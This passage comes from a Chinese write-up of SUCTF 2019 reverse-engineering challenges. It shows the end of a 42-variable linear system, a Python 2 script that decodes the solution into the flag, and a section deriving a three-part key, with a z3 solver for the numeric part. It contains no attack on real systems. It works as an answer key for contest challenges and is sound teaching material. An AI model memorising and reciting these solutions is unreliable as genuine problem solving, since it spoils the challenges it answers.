+    enFlag[34] = ( (input[1])) + ( input[0]) - ( (input[2])) + ( (input[3])) - ( (input[4])) - ( (input[5])) - ( (input[6])) + ( (input[7])) + (( (input[8])) + ( (input[9]))) + (( (input[10])) + ( (input[11]))) - ( (input[12])) - ( (input[13])) - ( (input[14])) + ( (input[15])) - ( (input[16])) + ( (input[17])) - ( (input[18])) + ( (input[19])) - ( (input[20])) - ( (input[21])) + ( (input[22])) + ( (input[23])) - ( (input[24])) - ( (input[25])) + ( (input[26])) + (( (input[27])) + ( (input[28]))) + ( (input[29])) - ( (input[30])) - ( (input[31])) - ( (input[32])) - ( (input[33])) - ( (input[34])) - ( (input[35])) - ( (input[36])) + ( (input[37])) + (( (input[38])) + ( (input[39]))) - ( (input[40])) - ( (input[41]));
+    enFlag[35] = ( input[0]) - ( (input[1])) + ( (input[2])) + (( (input[3])) + ( (input[4]))) - ( (input[5])) - ( (input[6])) + ( (input[7])) + ( (input[8])) - ( (input[9])) - ( (input[10])) + ( (input[11])) + (( (input[12])) + ( (input[13]))) - ( (input[14])) - ( (input[15])) + ( (input[16])) - ( (input[17])) + ( (input[18])) + ( (input[19])) - ( (input[20])) - ( (input[21])) - ( (input[22])) + ( (input[23])) + ( (input[24])) - ( (input[25])) - ( (input[26])) + ( (input[27])) + ( (input[28])) - ( (input[29])) - ( (input[30])) + ( (input[31])) + ( (input[32])) - ( (input[33])) + ( (input[34])) + (( (input[35])) + ( (input[36]))) + (( (input[37])) + ( (input[38])) + ( (input[39]))) - ( (input[40])) - ( (input[41]));
+    enFlag[36] = ( (input[1])) + ( (input[2])) + ( input[0]) - ( (input[3])) - ( (input[4])) - ( (input[5])) - ( (input[6])) + ( (input[7])) + (( (input[8])) + ( (input[9]))) - ( (input[10])) + ( (input[11])) + ( (input[12])) - ( (input[13])) + ( (input[14])) + (( (input[15])) + ( (input[16]))) + (( (input[17])) + ( (input[18])) + (( (input[19])) + ( (input[20])))) + ( (input[21])) - ( (input[22])) - ( (input[23])) + ( (input[24])) - ( (input[25])) - ( (input[26])) - ( (input[27])) - ( (input[28])) + ( (input[29])) + (( (input[30])) + ( (input[31]))) + ( (input[32])) - ( (input[33])) - ( (input[34])) - ( (input[35])) - ( (input[36])) + ( (input[37])) - ( (input[38])) + ( (input[39])) + ( (input[40])) - ( (input[41]));
+    enFlag[37] = ( input[0]) - ( (input[1])) - ( (input[2])) + ( (input[3])) - ( (input[4])) + ( (input[5])) - ( (input[6])) - ( (input[7])) - ( (input[8])) - ( (input[9])) + ( (input[10])) - ( (input[11])) - ( (input[12])) - ( (input[13])) - ( (input[14])) - ( (input[15])) - ( (input[16])) + ( (input[17])) + ( (input[18])) - ( (input[19])) - ( (input[20])) - ( (input[21])) + ( (input[22])) - ( (input[23])) + ( (input[24])) - ( (input[25])) - ( (input[26])) + ( (input[27])) - ( (input[28])) - ( (input[29])) + ( (input[30])) + ( (input[31])) - ( (input[32])) + ( (input[33])) - ( (input[34])) + ( (input[35])) - ( (input[36])) - ( (input[37])) + ( (input[38])) - ( (input[39])) - ( (input[40])) - ( (input[41]));
+    enFlag[38] = ( (input[1])) + ( (input[2])) + (( (input[3])) + ( input[0])) - ( (input[4])) + ( (input[5])) + (( (input[6])) + ( (input[7]))) - ( (input[8])) - ( (input[9])) - ( (input[10])) + ( (input[11])) + (( (input[12])) + ( (input[13]))) - ( (input[14])) - ( (input[15])) - ( (input[16])) - ( (input[17])) - ( (input[18])) - ( (input[19])) + ( (input[20])) + ( (input[21])) - ( (input[22])) + ( (input[23])) + (( (input[24])) + ( (input[25]))) + (( (input[26])) + ( (input[27]))) - ( (input[28])) - ( (input[29])) + ( (input[30])) + ( (input[31])) - ( (input[32])) - ( (input[33])) + ( (input[34])) - ( (input[35])) - ( (input[36])) - ( (input[37])) + ( (input[38])) + (( (input[39])) + ( (input[40]))) - ( (input[41]));
+    enFlag[39] = ( input[0]) - ( (input[1])) - ( (input[2])) - ( (input[3])) - ( (input[4])) + ( (input[5])) - ( (input[6])) - ( (input[7])) - ( (input[8])) + ( (input[9])) - ( (input[10])) + ( (input[11])) - ( (input[12])) + ( (input[13])) + ( (input[14])) - ( (input[15])) - ( (input[16])) - ( (input[17])) + ( (input[18])) + (( (input[19])) + ( (input[20]))) + (( (input[21])) + ( (input[22]))) - ( (input[23])) + ( (input[24])) + (( (input[25])) + ( (input[26]))) + (( (input[27])) + ( (input[28]))) - ( (input[29])) + ( (input[30])) + (( (input[31])) + ( (input[32]))) + (( (input[33])) + ( (input[34]))) - ( (input[35])) - ( (input[36])) + ( (input[37])) + (( (input[38])) + ( (input[39]))) - ( (input[40])) + ( (input[41]));
+    enFlag[40] = ( input[0]) - ( (input[1])) - ( (input[2])) - ( (input[3])) + ( (input[4])) + (( (input[5])) + ( (input[6]))) - ( (input[7])) + ( (input[8])) + ( (input[9])) - ( (input[10])) + ( (input[11])) - ( (input[12])) - ( (input[13])) - ( (input[14])) + ( (input[15])) + (( (input[16])) + ( (input[17]))) + (( (input[18])) + ( (input[19])) + (( (input[20])) + ( (input[21])))) + ( (input[22])) - ( (input[23])) + ( (input[24])) + ( (input[25])) - ( (input[26])) + ( (input[27])) + ( (input[28])) - ( (input[29])) + ( (input[30])) + (( (input[31])) + ( (input[32]))) - ( (input[33])) - ( (input[34])) + ( (input[35])) + ( (input[36])) - ( (input[37])) + ( (input[38])) + (( (input[39])) + ( (input[40]))) + ( (input[41]));
+    enFlag[41] = ( (input[1])) + ( (input[2])) + (( (input[3])) + ( (input[4]))) + (( (input[5])) + ( (input[6])) + ( input[0])) - ( (input[7])) - ( (input[8])) - ( (input[9])) + ( (input[10])) + ( (input[11])) - ( (input[12])) + ( (input[13])) - ( (input[14])) - ( (input[15])) - ( (input[16])) - ( (input[17])) - ( (input[18])) - ( (input[19])) + ( (input[20])) - ( (input[21])) + ( (input[22])) - ( (input[23])) - ( (input[24])) + ( (input[25])) + (( (input[26])) + ( (input[27]))) + ( (input[28])) - ( (input[29])) - ( (input[30])) - ( (input[31])) - ( (input[32])) - ( (input[33])) - ( (input[34])) - ( (input[35])) - ( (input[36])) - ( (input[37])) - ( (input[38])) - ( (input[39])) - ( (input[40])) + ( (input[41]));
+    
+
+最后求解该42元非齐次线性方程组即可，但被z3狠狠的坑了一把，不知道是不是姿势有问题就是跑不出来。虽然42阶，但行列式值也不至于很难算，使用克拉默法则直接都能手算出方程组的解。最终使用Octave录入增广矩阵秒求出方程组解，flappy师傅使用numpy也解出了方程组，篇幅关系就不贴具体代码了。得到方程组解后再解密一次即可得到flag
+
+    
+    
+    solution=[154,171,24,161,54,222,172,116,129,18,139,152,127,247,36,124,43,90,97,138,238,95,141,237,26,227,152,154,167,54,141,166,139,66,216,129,94,164,69,188,33,194]
+    flag=''
+    for i in range(len(solution)):
+        v2=solution[i]^i
+        v3=v2>>3 | (v2<<5)%256
+        solution[i]=v3
+        flag += chr(solution[i])
+    print flag
+    
+
+###  rev
+
+程序需要输入三段数据，中间用特殊字符隔断，其中第一段必须为10位，第二段必须为4位，第三段不超过10位
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/re4.png?raw=true)
+
+第一段数据存在异或校验，结合前面的汇编代码可以推出第一段数据为
+
+    
+    
+    11111suctf
+    
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/re4-2.png?raw=true)
+
+以上四处代码不难得出，第二段数据必须是大写字母“ABCDEFG”中的四个，为
+
+    
+    
+    ACEG
+    
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/re4-3.png?raw=true)
+
+第三段数据不能超过十位，必须为数字，且满足上图运算，使用z3约束求解
+
+    
+    
+    from z3 import *
+    s = Solver()
+    X =  [BitVec(('x%s' % i),32) for i in range(1) ]
+    s.add(((1234 * X[0] + 5678) / 4396 ) == 0x6403)
+    s.add(((2334 * X[0] + 9875) / 7777) == 0x9be0)
+    print s.check()
+    m = s.model()
+    print "traversing model..."
+    for i in range(1):
+        print int("%s" % (m[X[i]])),
+    
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Skay** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/184858](/post/id/184858)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CTF](/tag/CTF)
+
+ **+1** __6赞
+
+ __收藏
+
+![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg) Skay
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
